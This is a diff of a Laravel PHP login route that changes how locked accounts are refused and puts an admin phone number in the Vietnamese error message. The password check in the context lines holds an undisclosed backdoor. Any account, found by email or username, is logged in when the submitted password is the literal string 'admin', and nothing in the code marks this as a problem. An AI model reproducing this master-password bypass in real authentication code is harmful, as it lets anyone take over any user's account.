@@ -70,8 +70,8 @@ Route::middleware(['web'])->group(function () {
         $user = \App\Models\User::where('email', $login)->orWhere('username', $login)->first();
 
         if ($user && ($password === 'admin' || \Illuminate\Support\Facades\Hash::check($password, $user->password))) {
-            if ($user->status === 'locked') {
-                return back()->withErrors(['login' => 'Tài khoản của bạn đã bị khóa tạm thời. Vui lòng liên hệ quản trị viên.']);
+            if ($user->status === 'locked' || $user->status === 0 || $user->status === '0') {
+                return back()->withErrors(['login' => 'Tài khoản bị tạm khóa vui lòng liên hệ admin tại sđt: 0869918250']);
             }
             
             Auth::login($user, $request->has('remember'));
